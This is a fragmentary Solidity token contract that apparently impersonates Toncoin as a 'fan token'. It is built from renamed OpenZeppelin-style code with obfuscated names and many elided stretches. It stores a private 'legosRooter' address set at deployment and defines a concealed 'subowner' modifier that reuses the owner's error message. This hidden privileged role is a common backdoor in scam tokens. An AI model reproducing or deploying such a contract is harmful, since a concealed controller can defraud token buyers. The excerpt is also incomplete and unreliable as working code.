...
/// https://x.com/ToncoinTONcoin


pragma solidity 0.8.29;

// ToncoinTONcoin fan token

interface ToncoinTONcoininterface {
  /**
...
/*
 * @dev Provides information about the current execution ToncoinTONcoin20Burnable, including the
 ...
 */
abstract contract ToncoinTONcoin20Burnable {
...
// File: @openzeppelin/contracts/access/ToncoinTONcoin20Ownable.sol
 ...
 * the owner.
 */
abstract contract ToncoinTONcoin20Ownable is ToncoinTONcoin20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ToncoinTONcoin20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ToncoinTONcoin20Ownable: new owner is the zero address");
 ...
 * `SafeToncoinTONcoin` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeToncoinTONcoin {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeToncoinTONcoin: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeToncoinTONcoin: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeToncoinTONcoin: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeToncoinTONcoin: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeToncoinTONcoin: modulo by zero");
  }
...
contract ToncoinTONcoinToken is ToncoinTONcoin20Burnable, ToncoinTONcoininterface, ToncoinTONcoin20Ownable {
    
    using SafeToncoinTONcoin for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Toncoin TONc oin";
        _symbol = "$Toncoin TON coin";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {ToncoinTONcoininterface-totalSupply}.
    */
    ...
    /**
    * @dev See {ToncoinTONcoininterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "ToncoinTONcoin20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {ToncoinTONcoininterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ToncoinTONcoininterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ToncoinTONcoininterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {ToncoinTONcoininterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {ToncoinTONcoininterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "ToncoinTONcoininterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {ToncoinTONcoininterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "ToncoinTONcoininterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "ToncoinTONcoininterface: transfer from the zero address");
        require(shippingto != address(0), "ToncoinTONcoininterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "ToncoinTONcoininterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "ToncoinTONcoininterface: approve from the zero address");
        require(transporteur != address(0), "ToncoinTONcoininterface: approve to the zero address");
